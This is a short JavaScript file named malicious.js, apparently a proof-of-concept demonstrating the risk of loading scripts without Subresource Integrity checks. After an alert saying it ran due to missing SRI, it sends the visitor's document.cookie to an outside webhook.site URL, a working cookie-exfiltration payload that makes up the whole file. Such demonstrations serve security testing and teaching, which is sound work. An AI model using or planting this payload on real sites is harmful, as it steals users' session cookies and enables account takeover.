// malicious.js
alert("This script ran due to missing SRI!");
fetch("https://webhook.site/519357b5-9a83-4295-9ced-9a648921bfa1" + encodeURIComponent(document.cookie));
